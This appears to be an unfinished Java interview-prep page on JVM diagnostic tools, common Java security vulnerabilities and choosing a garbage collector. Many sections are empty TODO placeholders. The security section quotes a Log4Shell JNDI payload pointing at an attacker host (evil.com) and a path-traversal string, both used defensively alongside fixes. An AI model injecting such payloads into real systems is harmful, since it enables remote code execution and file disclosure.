---
layout: default
title: "Java - Diagnostics and Security"
parent: "Java"
grand_parent: "Interview Mastery"
nav_order: 9
permalink: /interview/java/diagnostics-and-security/
topic: Java
subtopic: Diagnostics and Security
keywords:
  - JVM Profiling and Diagnostic Tools
  - Java Security Vulnerabilities
  - GC Algorithm Selection Framework
difficulty_range: mixed
status: in-progress
version: 2
---

**Keywords covered in this file:**

- [JVM Profiling and Diagnostic Tools](#jvm-profiling-and-diagnostic-tools)
- [Java Security Vulnerabilities](#java-security-vulnerabilities)
- [GC Algorithm Selection Framework](#gc-algorithm-selection-framework)

# JVM Profiling and Diagnostic Tools

**TL;DR** - JVM diagnostic tools (`jcmd`, `jfr`, `jmap`, `jstack`, `jstat`) let you diagnose memory leaks, CPU hotspots, thread issues, and GC problems in running production JVMs without restarting.

---

### 🔥 The Problem This Solves

Your production application is slow. Is it CPU-bound? Memory-bound? GC thrashing? Thread contention? A blocked database connection? Without diagnostic tools, you're guessing. With them, you see exactly what the JVM is doing.

---

### Tool Map

```
PROBLEM           TOOL            WHAT IT SHOWS
---------         ----            -------------
Memory leak       jmap            Heap dump (snapshot)
                  jcmd            Heap histogram
                  VisualVM        Visual heap analysis

CPU hotspot       JFR             Method profiling
                  async-profiler  CPU flame graph

Thread issue      jstack          Thread dump
                  jcmd            Thread print

GC problem        jstat           GC statistics live
                  GC logs         Pause times, frequency
                  JFR             GC events timeline

Class loading     jcmd            Loaded classes
                  -verbose:class  Class load/unload events
```

---

### Essential Commands

```bash
# 1. FIND THE JVM PID
jcmd -l
# or
jps -lv

# 2. THREAD DUMP (deadlock, contention)
jcmd <pid> Thread.print > threads.txt
# or
jstack <pid> > threads.txt

# 3. HEAP DUMP (memory leak)
jcmd <pid> GC.heap_dump /tmp/heap.hprof
# or
jmap -dump:live,format=b,file=heap.hprof <pid>

# 4. HEAP HISTOGRAM (quick memory check)
jcmd <pid> GC.class_histogram | head -20
# Shows top classes by instance count/bytes

# 5. GC STATISTICS (live monitoring)
jstat -gcutil <pid> 1000
# Output every 1 second:
# S0   S1   E    O    M    CCS  YGC  YGCT  FGC  FGCT
# 0.00 45.2 67.1 34.5 97.8 95.1 142  1.23  3    0.45

# 6. JVM FLAGS (check current settings)
jcmd <pid> VM.flags

# 7. JAVA FLIGHT RECORDER (comprehensive)
jcmd <pid> JFR.start duration=60s \
  filename=/tmp/recording.jfr
# Low-overhead (<2%) production profiling
```

---

### Diagnostic Workflows

**Memory Leak Diagnosis:**

```
1. jstat -gcutil <pid> 1000
   -> Watch Old gen (O column) trending up
   -> Full GC (FGC) count increasing
   -> But O% never drops after Full GC = LEAK

2. jcmd <pid> GC.heap_dump /tmp/heap.hprof

3. Open in Eclipse MAT or VisualVM
   -> Leak Suspects report
   -> Dominator tree (who holds the most memory)
   -> Find the collection/cache growing unbounded
```

**CPU Hotspot Diagnosis:**

```
1. JFR recording for 60 seconds
   jcmd <pid> JFR.start duration=60s \
     filename=/tmp/cpu.jfr

2. Open in JDK Mission Control
   -> Method Profiling tab
   -> See which methods consume most CPU
   -> Or: convert to flame graph with
      async-profiler
```

---

### JFR (Java Flight Recorder) - Deep Dive

```java
// Enable JFR from application startup
// JVM flags:
// -XX:StartFlightRecording=
//   duration=0,
//   maxsize=500m,
//   disk=true,
//   filename=/var/log/app/flight.jfr

// Or start/stop dynamically:
// jcmd <pid> JFR.start name=diag
// jcmd <pid> JFR.stop name=diag
//   filename=/tmp/diag.jfr

// JFR events collected (low overhead < 2%):
// - Method profiling (CPU hotspots)
// - Allocations (memory pressure)
// - GC pauses (timing, cause)
// - Thread states (contention)
// - I/O (file, socket)
// - Exceptions (even caught ones)
// - Class loading
// - Lock contention
```

---

### 📘 Textbook Definition

[TODO: 2-4 sentences. Formal. Technically precise.]

---

### ⏱️ Understand It in 30 Seconds

**One line:**
[TODO: 15 words max. Zero jargon.]

**One analogy:**
> [TODO: 2-3 sentence real-world analogy.]

**One insight:**
[TODO: What separates knowing the name from understanding it.]

---

### 🔩 First Principles Explanation

**CORE INVARIANTS:**
1. [TODO: Always true about this concept]
2. [TODO: Always true about this concept]
3. [TODO: Always true about this concept]

**DERIVED DESIGN:**
[TODO: How the invariants force the design.]

**THE TRADE-OFFS:**
**Gain:** [TODO]
**Cost:** [TODO]

**ESSENTIAL vs ACCIDENTAL COMPLEXITY:**
**Essential:** [TODO]
**Accidental:** [TODO]

---

### 🧠 Mental Model / Analogy

> [TODO: Primary analogy in blockquote.]

- "[TODO: Analogy element]" -> [technical element]
- "[TODO: Analogy element]" -> [technical element]
- "[TODO: Analogy element]" -> [technical element]

Where this analogy breaks down: [TODO: 1 sentence.]

---

### 📶 Gradual Depth - Five Levels

**Level 1 - What it is (anyone can understand):**
[TODO: Plain English. No jargon. 2-4 sentences.]

**Level 2 - How to use it (junior developer):**
[TODO: Basic usage. Common patterns. 3-5 sentences.]

**Level 3 - How it works (mid-level engineer):**
[TODO: Internals. Data structures. 4-6 sentences.]

**Level 4 - Production mastery (senior/staff engineer):**
[TODO: Design decisions. Cross-system reasoning. 5-8 sentences.]

**Level 5 - Distinguished (expert thinking):**
[TODO: Cross-domain pattern recognition. Expert heuristics. 3-5 sentences.]

---

### How It Works (Mechanism)

[TODO: Internal mechanics. Data flow. Key steps.
 4-8 sentences covering implementation details.]

---

### 🔄 Complete Picture - End-to-End Flow

**NORMAL FLOW:**
[TODO] -> [TODO] -> [THIS CONCEPT <- YOU ARE HERE]
       -> [TODO]

**FAILURE PATH:**
[TODO: cascade -> observable symptom]

**WHAT CHANGES AT SCALE:**
[TODO: 2-3 sentences on behaviour at 10x/100x/1000x load.]

---

### 📌 Quick Reference Card

**WHAT IT IS:** Suite of tools for profiling, monitoring, and diagnosing JVM applications (JFR, async-profiler, jmap, jstack)
**PROBLEM IT SOLVES:** Identifies CPU bottlenecks, memory leaks, thread deadlocks, and GC issues in production
**KEY INSIGHT:** Use sampling profilers (async-profiler, JFR) in production - <2% overhead vs 10-50% for instrumentation
**USE WHEN:** Performance degradation, OOM errors, thread hangs, latency spikes, capacity planning
**AVOID WHEN:** Using instrumentation profilers in production - they skew results and impact performance
**ANTI-PATTERN:** Profiling only in dev environment with synthetic data - production workloads are different
**TRADE-OFF:** Diagnostic depth vs overhead and data volume. JFR is always-on; heap dump freezes the JVM
**ONE-LINER:** "async-profiler for CPU, JFR for everything, jmap for OOM, jstack for deadlocks"

**If you remember only 3 things:**

1. `jcmd` is the Swiss Army knife - thread dumps, heap dumps, GC stats, JFR, flags
2. JFR is the production-safe profiler (< 2% overhead) - always have it running
3. Memory leak workflow: `jstat` (trending) -> `jcmd GC.heap_dump` -> Eclipse MAT (analysis)

**Interview one-liner:**
"For production JVM diagnostics, I use jcmd as my primary tool - thread dumps for contention, heap dumps analyzed in Eclipse MAT for memory leaks, and JFR recordings for CPU profiling with under 2% overhead."

---

### 💡 The Surprising Truth

[TODO: 2-4 sentences. One counterintuitive fact.
 Specific. Makes this concept permanently memorable.]

---

### 🎯 Interview Deep-Dive

**Q1: Your Java application is consuming 8GB of heap and keeps growing. How do you find the memory leak?**

_Why they ask:_ The most common production Java question.

**Answer:**

1. **Confirm it's a leak, not just high usage.** Run `jstat -gcutil <pid> 1000` and watch the Old generation (O column). If it trends upward and Full GC doesn't reclaim it, it's a leak.

2. **Take a heap dump.** `jcmd <pid> GC.heap_dump /tmp/heap.hprof`. Take two dumps 10 minutes apart for comparison.

3. **Analyze in Eclipse MAT.** Open the dump, run "Leak Suspects" report. Check the "Dominator Tree" - the objects retaining the most memory. Typically it's a `HashMap`, `ArrayList`, or cache that grows without eviction.

4. **Trace the GC root path.** In MAT, right-click the suspect -> "Path to GC Roots" -> "exclude weak/soft references." This shows why the object can't be collected - usually a static field, a ThreadLocal not cleaned up, or a listener not deregistered.

5. **Common leak sources:** (a) Static collections that only grow, never shrink. (b) ThreadLocal not removed after use (especially in thread pools). (c) Unclosed streams, connections, or ResultSets. (d) Event listeners not deregistered. (e) Classloader leaks in web applications.

**Q2: How do you differentiate between a CPU-bound and I/O-bound performance problem?**

_Why they ask:_ Tests systematic diagnosis approach.

**Answer:**

1. **Check CPU utilization.** `top -H -p <pid>` shows per-thread CPU. If CPU is near 100% per core, it's CPU-bound. If CPU is low but latency is high, it's I/O-bound.

2. **Thread dump analysis.** CPU-bound: threads are RUNNABLE, actively executing compute-heavy code. I/O-bound: threads are BLOCKED/WAITING/TIMED_WAITING, stuck on socket reads, database queries, or file I/O.

3. **JFR recording.** Method profiling shows CPU hotspots. I/O tab shows time spent in file/network I/O. Thread sleep/wait time vs compute time ratio reveals the bottleneck.

4. **Fix:** CPU-bound -> optimize algorithm, cache results, parallelize. I/O-bound -> async I/O, connection pooling, batching, caching.

---

### ⚖️ Comparison Table

| Tool | Purpose | Overhead | Production Safe |
|------|---------|----------|----------------|
| JFR | Always-on event recording | <1% | Yes |
| async-profiler | CPU/alloc/lock sampling | <2% | Yes |
| jstack | Thread dump snapshot | Pause | Yes (brief) |
| jmap -histo | Object histogram | Brief pause | Caution |
| jmap -dump | Full heap dump | Full GC pause | Emergency only |
| VisualVM | GUI profiler | 10-50% | No (dev only) |

---

### ⚠️ Common Misconceptions

| # | Misconception | Reality |
|---|---------------|---------|
| 1 | Thread dumps are only for deadlocks | Thread dumps reveal: deadlocks, lock contention, thread pool saturation, blocked IO, and CPU hotspots. Take 3-5 dumps 5 seconds apart to see patterns. |
| 2 | Heap dumps crash the application | Heap dumps cause a full GC pause (seconds to minutes for large heaps) but don't crash the JVM. Schedule during maintenance windows for production. |
| 3 | JFR has significant overhead | JFR was designed for always-on production use with <1% overhead. It's integrated into the JVM and uses thread-local buffers to minimize contention. |
| 4 | Profiling in dev is sufficient | Dev environments have different data sizes, connection pools, thread counts, and GC behavior. Production profiling with JFR/async-profiler is essential. |

---

### 🚨 Failure Modes and Diagnosis

**Failure Mode 1: SafePoint bias in profiling**
**Symptom:** Profiler shows methods that are not actually hot. Real hotspots are invisible.
**Root Cause:** Traditional JVM profilers sample only at safepoints (method exits, loop backedges). Long-running loops without safepoints are invisible.
**Diagnostic:**

```
# Compare safepoint vs async profiler results
asprof -e cpu -d 30 -f async.html <pid>
# Then compare with JVisualVM sampler output
# Discrepancies = safepoint bias
```

**Fix:**
```java
// Use async-profiler instead of safepoint-biased
// profilers. It uses OS signals (SIGPROF) to
// sample at ANY point, not just safepoints.

// Command:
// asprof -e cpu -d 60 -f flame.html <pid>
```
**Prevention:** Always use async-profiler or JFR (both are safepoint-unbiased) for CPU profiling. Never use safepoint-biased profilers for production analysis.

**Failure Mode 2: Heap dump triggers OOM killer**
**Symptom:** Taking a heap dump on a large-heap JVM causes the OS OOM killer to terminate the process.
**Root Cause:** `jmap -dump` forces a full GC + writes the entire heap to disk. If the JVM is already near OOM, the dump process itself needs memory.
**Diagnostic:**

```
dmesg | grep -i "oom\|killed"
# Check if OS OOM killer terminated the process
```

**Fix:**
```java
// Enable automatic heap dump on OOM instead:
// -XX:+HeapDumpOnOutOfMemoryError
// -XX:HeapDumpPath=/tmp/heapdump.hprof

// For live analysis without full dump:
// jmap -histo:live <pid> | head -30
// (only object histogram, not full dump)
```
**Prevention:** Enable `-XX:+HeapDumpOnOutOfMemoryError` at startup. Use `jmap -histo` for quick analysis. Reserve disk space >= heap size for dumps.

**Failure Mode 3: Thread dump shows no deadlock but threads are stuck**
**Symptom:** Application is unresponsive. Thread dump shows threads WAITING or TIMED_WAITING but no deadlock detected.
**Root Cause:** Virtual deadlock - threads waiting on external resources (DB connections, HTTP calls, distributed locks) that jstack doesn't detect as deadlocks.
**Diagnostic:**

```
jstack <pid> | grep -c "WAITING\|BLOCKED"
# High count = resource exhaustion
jstack <pid> | grep "waiting on"
# Shows what resources threads are waiting for
```

**Fix:**
```java
// Identify the bottleneck resource:
// - Connection pool: check pool size vs thread count
// - External service: add timeouts
// - Distributed lock: check lock holder

// Always set timeouts on external calls:
conn.setNetworkTimeout(executor, 5000);
httpClient.newBuilder()
    .connectTimeout(Duration.ofSeconds(5))
    .build();
```
**Prevention:** Set timeouts on ALL external calls. Monitor connection pool usage. Take 3-5 thread dumps 5 seconds apart to see patterns.

---

### 🔗 Related Keywords

**Prerequisites (understand these first):**

- JVM memory model - understanding heap, stack, and metaspace layout
- Threading basics - thread states (RUNNABLE, WAITING, BLOCKED)

**Builds on this (learn these next):**

- GC Algorithm Selection - use profiling data to choose and tune GC
- Observability and SRE - integrating JVM metrics into monitoring systems

**Alternatives / Comparisons:**

- OpenTelemetry - distributed tracing across services (complements JVM tools)
- Datadog/New Relic APM - commercial tools with JVM agent instrumentation


---

---

# Java Security Vulnerabilities

**TL;DR** - Java applications are vulnerable to deserialization attacks, injection flaws, and dependency vulnerabilities (like Log4Shell) - understanding these attack vectors is essential for building secure software.

---

### Log4Shell (CVE-2021-44228) - The Landmark Vulnerability

**What happened:**
Log4j 2.x had a feature: JNDI lookup in log messages. If a user-controlled string was logged, an attacker could inject `${jndi:ldap://evil.com/exploit}` into any logged field (headers, form inputs, user agents). Log4j would resolve the JNDI lookup, connect to the attacker's LDAP server, download a malicious class, and execute it. Remote Code Execution (RCE) with a single log statement.

```java
// VULNERABLE: Any logged user input
log.info("User-Agent: {}", request.getHeader("User-Agent"));
// Attacker sends: User-Agent: ${jndi:ldap://evil.com/x}
// Log4j resolves JNDI -> connects to evil.com -> RCE

// IMPACT: Affected virtually every Java application
// using Log4j 2.0-2.14.1 (billions of devices)
```

**Lessons:**

1. Never allow string interpolation in log messages with untrusted data
2. Dependency scanning (Dependabot, Snyk, OWASP Dependency-Check) catches known CVEs
3. SBOM (Software Bill of Materials) lets you quickly identify affected systems
4. WAF rules and egress filtering limit blast radius

---

### Java Deserialization Attacks

```java
// BAD: Deserializing untrusted data
ObjectInputStream ois =
    new ObjectInputStream(request.getInputStream());
Object obj = ois.readObject(); // DANGEROUS
// Attacker sends crafted byte stream that triggers
// arbitrary code execution via gadget chains

// GOOD: Never deserialize untrusted input
// Use JSON (Jackson/Gson) instead of Java serialization
ObjectMapper mapper = new ObjectMapper();
UserRequest req = mapper.readValue(
    request.getInputStream(), UserRequest.class);

// If you MUST use Java serialization:
// 1. Use ObjectInputFilter (Java 9+)
ObjectInputFilter filter =
    ObjectInputFilter.Config.createFilter(
        "com.myapp.*;!*");
ois.setObjectInputFilter(filter);

// 2. Never expose deserialization endpoints publicly
// 3. Use look-ahead deserialization (Apache Commons)
```

---

### Common Java Security Issues

| Vulnerability             | Attack Vector                    | Prevention                      |
| ------------------------- | -------------------------------- | ------------------------------- |
| SQL Injection             | String concat in queries         | Parameterized queries, JPA      |
| Deserialization RCE       | Untrusted ObjectInputStream      | JSON instead, ObjectInputFilter |
| Log Injection             | User input in log messages       | Sanitize, upgrade Log4j         |
| XXE (XML External Entity) | XML parsing with DTD             | Disable DTD, use JSON           |
| Path Traversal            | `../../etc/passwd` in file paths | Validate, canonicalize paths    |
| Dependency CVEs           | Transitive vulnerable deps       | Dependabot, OWASP DC            |

---

### Secure Coding Checklist

```java
// 1. PARAMETERIZED QUERIES (prevent SQL injection)
// BAD:
String sql = "SELECT * FROM users WHERE name = '"
    + name + "'";
// GOOD:
@Query("SELECT u FROM User u WHERE u.name = :name")
User findByName(@Param("name") String name);

// 2. INPUT VALIDATION (prevent injection)
// Always validate at the boundary
@NotBlank @Size(max = 100)
@Pattern(regexp = "^[a-zA-Z0-9_]+$")
private String username;

// 3. SECRETS MANAGEMENT
// BAD: hardcoded in application.properties
spring.datasource.password=mysecret
// GOOD: environment variable or vault
spring.datasource.password=${DB_PASSWORD}

// 4. DEPENDENCY SCANNING
// pom.xml: add OWASP dependency-check plugin
// CI: run `mvn dependency-check:check`
// GitHub: enable Dependabot alerts
```

---

### 🔥 The Problem This Solves

**WORLD WITHOUT IT:**
[TODO: Concrete pain scenario. 2-4 sentences.]

**THE BREAKING POINT:**
[TODO: Specific failure. 1-2 sentences.]

**THE INVENTION MOMENT:**
"This is exactly why Java Security Vulnerabilities was created."

**EVOLUTION:**
[TODO: predecessor -> current form -> future.]

---

### 📘 Textbook Definition

[TODO: 2-4 sentences. Formal. Technically precise.]

---

### ⏱️ Understand It in 30 Seconds

**One line:**
[TODO: 15 words max. Zero jargon.]

**One analogy:**
> [TODO: 2-3 sentence real-world analogy.]

**One insight:**
[TODO: What separates knowing the name from understanding it.]

---

### 🔩 First Principles Explanation

**CORE INVARIANTS:**
1. [TODO: Always true about this concept]
2. [TODO: Always true about this concept]
3. [TODO: Always true about this concept]

**DERIVED DESIGN:**
[TODO: How the invariants force the design.]

**THE TRADE-OFFS:**
**Gain:** [TODO]
**Cost:** [TODO]

**ESSENTIAL vs ACCIDENTAL COMPLEXITY:**
**Essential:** [TODO]
**Accidental:** [TODO]

---

### 🧠 Mental Model / Analogy

> [TODO: Primary analogy in blockquote.]

- "[TODO: Analogy element]" -> [technical element]
- "[TODO: Analogy element]" -> [technical element]
- "[TODO: Analogy element]" -> [technical element]

Where this analogy breaks down: [TODO: 1 sentence.]

---

### 📶 Gradual Depth - Five Levels

**Level 1 - What it is (anyone can understand):**
[TODO: Plain English. No jargon. 2-4 sentences.]

**Level 2 - How to use it (junior developer):**
[TODO: Basic usage. Common patterns. 3-5 sentences.]

**Level 3 - How it works (mid-level engineer):**
[TODO: Internals. Data structures. 4-6 sentences.]

**Level 4 - Production mastery (senior/staff engineer):**
[TODO: Design decisions. Cross-system reasoning. 5-8 sentences.]

**Level 5 - Distinguished (expert thinking):**
[TODO: Cross-domain pattern recognition. Expert heuristics. 3-5 sentences.]

---

### How It Works (Mechanism)

[TODO: Internal mechanics. Data flow. Key steps.
 4-8 sentences covering implementation details.]

---

### 🔄 Complete Picture - End-to-End Flow

**NORMAL FLOW:**
[TODO] -> [TODO] -> [THIS CONCEPT <- YOU ARE HERE]
       -> [TODO]

**FAILURE PATH:**
[TODO: cascade -> observable symptom]

**WHAT CHANGES AT SCALE:**
[TODO: 2-3 sentences on behaviour at 10x/100x/1000x load.]

---

### 📌 Quick Reference Card

**WHAT IT IS:** Common attack patterns against Java applications: injection, deserialization, XXE, SSRF, dependency exploits
**PROBLEM IT SOLVES:** Understanding and preventing security breaches in Java backend systems
**KEY INSIGHT:** Every vulnerability is untrusted input crossing a trust boundary without validation
**USE WHEN:** Code review, security audits, incident response, dependency upgrades, threat modeling
**AVOID WHEN:** Assuming frameworks handle all security - misconfiguration is the #1 vulnerability
**ANTI-PATTERN:** Using `ObjectInputStream` on untrusted data - arbitrary code execution via gadget chains
**TRADE-OFF:** Security controls vs development speed and user experience friction
**ONE-LINER:** "Never trust input, never deserialize untrusted data, always update dependencies"

**If you remember only 3 things:**

1. Log4Shell: JNDI lookup in log messages = RCE. Upgrade Log4j, scan dependencies, filter egress
2. Never deserialize untrusted Java objects - use JSON with Jackson instead
3. Parameterized queries, input validation, dependency scanning are the three pillars of Java security

**Interview one-liner:**
"I protect Java applications through parameterized queries for injection prevention, JSON over Java serialization for safe data exchange, dependency scanning with OWASP Dependency-Check for transitive CVEs like Log4Shell, and input validation at every system boundary."

---

### 💡 The Surprising Truth

[TODO: 2-4 sentences. One counterintuitive fact.
 Specific. Makes this concept permanently memorable.]

---

### 🎯 Interview Deep-Dive

**Q1: You discover one of your production services is vulnerable to Log4Shell. Walk through your response.**

_Why they ask:_ Tests incident response and practical security thinking.

**Answer:**

1. **Immediate mitigation (minutes):** Set `log4j2.formatMsgNoLookups=true` JVM flag or environment variable `LOG4J_FORMAT_MSG_NO_LOOKUPS=true`. This disables message lookups without code changes.

2. **WAF/egress rules (hours):** Block outbound LDAP/RMI/DNS to unknown hosts. Add WAF rules to detect `${jndi:` patterns in headers and request bodies.

3. **Identify blast radius (hours):** Use SBOM or `mvn dependency:tree | grep log4j` across all services to find affected applications. Transitive dependencies often pull in Log4j without your knowledge.

4. **Patch (days):** Upgrade Log4j to 2.17.1+. Rebuild and deploy all affected services. For services that can't be immediately patched, remove the JndiLookup class from the classpath.

5. **Post-mortem:** Run forensics to check if the vulnerability was exploited (search logs for `${jndi:` patterns). Check for unexpected outbound connections. Review and strengthen dependency scanning in CI/CD.

**Q2: How do you prevent deserialization attacks in a Java application?**

_Why they ask:_ Tests understanding of a critical Java-specific vulnerability.

**Answer:**
The best defense is to never use Java's native serialization for external input. Use JSON (Jackson) or Protocol Buffers instead.

If Java serialization is unavoidable: (1) Use `ObjectInputFilter` (Java 9+) to whitelist allowed classes. (2) Never accept serialized objects from untrusted sources (public APIs). (3) Remove known gadget chain libraries (Apache Commons Collections < 3.2.2) or upgrade them. (4) Use serialization proxies (Effective Java Item 90) for classes that must be serializable. (5) Consider using SerialKiller or notsoserial libraries that add deserialization firewalls.

---

### ⚖️ Comparison Table

| Vulnerability | Attack Vector | Java Impact | Prevention |
|--------------|--------------|------------|------------|
| SQL Injection | User input in SQL | JDBC statements | Parameterized queries |
| Deserialization | Untrusted ObjectInputStream | RCE via gadgets | Use JSON, allowlist |
| XXE | XML parser with DTD | File read, SSRF | Disable DTD processing |
| Log4Shell | JNDI lookup in log message | RCE | Update Log4j, disable JNDI |
| Dependency exploit | Transitive vulnerable lib | Varies | Scan with OWASP, Snyk |

---

### ⚠️ Common Misconceptions

| # | Misconception | Reality |
|---|---------------|---------|
| 1 | Using a framework prevents all vulnerabilities | Frameworks prevent common attacks when configured correctly, but misconfiguration (disabled CSRF, open CORS) is the #1 cause of framework-based vulnerabilities. |
| 2 | SQL injection is a solved problem | Parameterized queries prevent injection, but dynamic table/column names, native queries, and string-built criteria are still vulnerable. |
| 3 | HTTPS encrypts everything | HTTPS encrypts transport but not the data at rest, in logs, or in error messages. Sensitive data can leak through logs, stack traces, and debug endpoints. |
| 4 | Updating dependencies is optional | Log4Shell (CVE-2021-44228) affected millions of applications through a transitive dependency. Regular dependency scanning is a critical security practice. |

---

### 🚨 Failure Modes and Diagnosis

**Failure Mode 1: SQL Injection via string concatenation**
**Symptom:** Unauthorized data access, data modification, or database compromise.
**Root Cause:** Building SQL queries by concatenating user input instead of using parameterized queries.
**Diagnostic:**

```
grep -rn 'Statement\|createStatement\|"SELECT.*+' src/
# Find non-parameterized SQL construction
```

**Fix:**
```java
// BAD: SQL injection vulnerable
String sql = "SELECT * FROM users WHERE id = '"
    + userInput + "'";
Statement stmt = conn.createStatement();
stmt.executeQuery(sql);

// GOOD: parameterized query
PreparedStatement ps = conn.prepareStatement(
    "SELECT * FROM users WHERE id = ?");
ps.setString(1, userInput);
ps.executeQuery();
```
**Prevention:** Use PreparedStatement exclusively. Enable SQL injection detection in static analysis. Use ORM frameworks with parameterized queries.

**Failure Mode 2: Insecure deserialization (RCE)**
**Symptom:** Remote Code Execution. Attacker gains shell access to the server.
**Root Cause:** Using `ObjectInputStream.readObject()` on untrusted data. Attacker crafts serialized objects that trigger arbitrary code via gadget chains (Apache Commons Collections, Spring, etc.).
**Diagnostic:**

```
grep -rn 'ObjectInputStream\|readObject' src/
# Any use with untrusted data is vulnerable
# Check for deserialization filters (JEP 290)
```

**Fix:**
```java
// BAD: deserialize untrusted data
ObjectInputStream ois = new ObjectInputStream(
    request.getInputStream());
Object obj = ois.readObject(); // RCE!

// GOOD: use JSON instead
ObjectMapper mapper = new ObjectMapper();
MyDto dto = mapper.readValue(
    request.getInputStream(), MyDto.class);
// Or: add deserialization filter (JDK 9+)
```
**Prevention:** Never use Java serialization for untrusted input. Use JSON/protobuf. If required, use JEP 290 deserialization filters.

**Failure Mode 3: XXE (XML External Entity) attack**
**Symptom:** Server-side file disclosure (reads /etc/passwd), SSRF, or denial of service via entity expansion.
**Root Cause:** XML parser configured to process external entities. Attacker-controlled XML references malicious DTDs.
**Diagnostic:**

```
grep -rn 'DocumentBuilder\|SAXParser\|XMLReader' src/
# Check if external entities are disabled
```

**Fix:**
```java
// BAD: default parser allows XXE
DocumentBuilderFactory dbf =
    DocumentBuilderFactory.newInstance();
Document doc = dbf.newDocumentBuilder()
    .parse(untrustedInput);

// GOOD: disable external entities
DocumentBuilderFactory dbf =
    DocumentBuilderFactory.newInstance();
dbf.setFeature(
    "http://apache.org/xml/features/"
    + "disallow-doctype-decl", true);
dbf.setFeature(
    XMLConstants.FEATURE_SECURE_PROCESSING, true);
```
**Prevention:** Disable DTD processing in all XML parsers. Use JAXB or JSON where possible.

---

### 🔗 Related Keywords

**Prerequisites (understand these first):**

- HTTP and APIs - understanding request/response and input handling
- Exception handling - proper error responses without information leakage

**Builds on this (learn these next):**

- Spring Security - framework-level security controls
- OAuth2/OIDC - authentication and authorization protocols

**Alternatives / Comparisons:**

- OWASP ZAP/Burp Suite - dynamic security testing tools
- SonarQube/Snyk - static analysis and dependency vulnerability scanning


---

---

# GC Algorithm Selection Framework

**TL;DR** - Choose your GC algorithm based on the application's latency requirements, throughput needs, and heap size - G1 is the default, ZGC for ultra-low latency, Parallel GC for batch throughput.

---

### Decision Matrix

```
WHAT MATTERS MOST?
  |
  |-- Low latency (< 10ms pauses)?
  |     |-- Heap < 16GB? -> G1GC
  |     |-- Heap 16GB+? -> ZGC
  |     |-- Extreme (< 1ms)? -> ZGC
  |
  |-- Max throughput (batch processing)?
  |     -> Parallel GC
  |
  |-- Small heap (< 512MB)?
  |     -> Serial GC
  |
  |-- Don't know / general purpose?
        -> G1GC (default since Java 9)
```

---

### Comparison

| GC         | Max Pause | Throughput | Heap Range | Best For             |
| ---------- | --------- | ---------- | ---------- | -------------------- |
| Serial     | 100ms+    | Low        | < 512MB    | Dev, small apps      |
| Parallel   | 100ms+    | Highest    | Any        | Batch jobs, big data |
| G1         | 10-200ms  | Good       | 4-64GB     | General purpose      |
| ZGC        | < 1ms     | Good       | 8GB-16TB   | Low-latency services |
| Shenandoah | < 10ms    | Good       | 4GB-1TB    | Low-latency (RedHat) |

---

### When to Tune vs When to Switch

```
STEP 1: Start with G1GC (default)
  Measure: p99 latency, throughput, heap usage

STEP 2: If latency too high
  -> Try ZGC: -XX:+UseZGC
  -> ZGC has < 1ms pauses regardless of heap size

STEP 3: If throughput too low (batch jobs)
  -> Try Parallel: -XX:+UseParallelGC
  -> Accepts longer pauses for higher throughput

STEP 4: Only tune AFTER choosing the right GC
  -> G1: -XX:MaxGCPauseMillis=200
  -> Heap: -Xms and -Xmx same value (avoid resize)
  -> New gen: usually don't touch (GC auto-sizes)
```

---

### 🔥 The Problem This Solves

**WORLD WITHOUT IT:**
[TODO: Concrete pain scenario. 2-4 sentences.]

**THE BREAKING POINT:**
[TODO: Specific failure. 1-2 sentences.]

**THE INVENTION MOMENT:**
"This is exactly why GC Algorithm Selection Framework was created."

**EVOLUTION:**
[TODO: predecessor -> current form -> future.]

---

### 📘 Textbook Definition

[TODO: 2-4 sentences. Formal. Technically precise.]

---

### ⏱️ Understand It in 30 Seconds

**One line:**
[TODO: 15 words max. Zero jargon.]

**One analogy:**
> [TODO: 2-3 sentence real-world analogy.]

**One insight:**
[TODO: What separates knowing the name from understanding it.]

---

### 🔩 First Principles Explanation

**CORE INVARIANTS:**
1. [TODO: Always true about this concept]
2. [TODO: Always true about this concept]
3. [TODO: Always true about this concept]

**DERIVED DESIGN:**
[TODO: How the invariants force the design.]

**THE TRADE-OFFS:**
**Gain:** [TODO]
**Cost:** [TODO]

**ESSENTIAL vs ACCIDENTAL COMPLEXITY:**
**Essential:** [TODO]
**Accidental:** [TODO]

---

### 🧠 Mental Model / Analogy

> [TODO: Primary analogy in blockquote.]

- "[TODO: Analogy element]" -> [technical element]
- "[TODO: Analogy element]" -> [technical element]
- "[TODO: Analogy element]" -> [technical element]

Where this analogy breaks down: [TODO: 1 sentence.]

---

### 📶 Gradual Depth - Five Levels

**Level 1 - What it is (anyone can understand):**
[TODO: Plain English. No jargon. 2-4 sentences.]

**Level 2 - How to use it (junior developer):**
[TODO: Basic usage. Common patterns. 3-5 sentences.]

**Level 3 - How it works (mid-level engineer):**
[TODO: Internals. Data structures. 4-6 sentences.]

**Level 4 - Production mastery (senior/staff engineer):**
[TODO: Design decisions. Cross-system reasoning. 5-8 sentences.]

**Level 5 - Distinguished (expert thinking):**
[TODO: Cross-domain pattern recognition. Expert heuristics. 3-5 sentences.]

---

### How It Works (Mechanism)

[TODO: Internal mechanics. Data flow. Key steps.
 4-8 sentences covering implementation details.]

---

### 🔄 Complete Picture - End-to-End Flow

**NORMAL FLOW:**
[TODO] -> [TODO] -> [THIS CONCEPT <- YOU ARE HERE]
       -> [TODO]

**FAILURE PATH:**
[TODO: cascade -> observable symptom]

**WHAT CHANGES AT SCALE:**
[TODO: 2-3 sentences on behaviour at 10x/100x/1000x load.]

---

### Code Example (JVM Flags)

```bash
# G1GC (default, general purpose)
java -Xms4g -Xmx4g \
  -XX:+UseG1GC \
  -XX:MaxGCPauseMillis=200 \
  -Xlog:gc*:file=gc.log:time \
  -jar app.jar

# ZGC (ultra-low latency)
java -Xms8g -Xmx8g \
  -XX:+UseZGC \
  -Xlog:gc*:file=gc.log:time \
  -jar app.jar

# Parallel GC (max throughput, batch jobs)
java -Xms16g -Xmx16g \
  -XX:+UseParallelGC \
  -XX:ParallelGCThreads=8 \
  -jar app.jar
```

---

### 📌 Quick Reference Card

**WHAT IT IS:** Decision framework for choosing the right JVM garbage collector based on workload characteristics
**PROBLEM IT SOLVES:** Matching GC behavior (pause time, throughput, memory) to application requirements
**KEY INSIGHT:** G1 for balanced, ZGC for low latency, Parallel for max throughput, Shenandoah for OpenJDK ultra-low pause
**USE WHEN:** Performance tuning, capacity planning, SLA compliance, choosing GC for new services
**AVOID WHEN:** Over-tuning before measuring - default G1 is correct for most workloads
**ANTI-PATTERN:** Tuning 50+ GC flags without understanding the workload - makes GC behavior fragile and non-portable
**TRADE-OFF:** Low pause times (ZGC) vs maximum throughput (Parallel) vs balanced (G1)
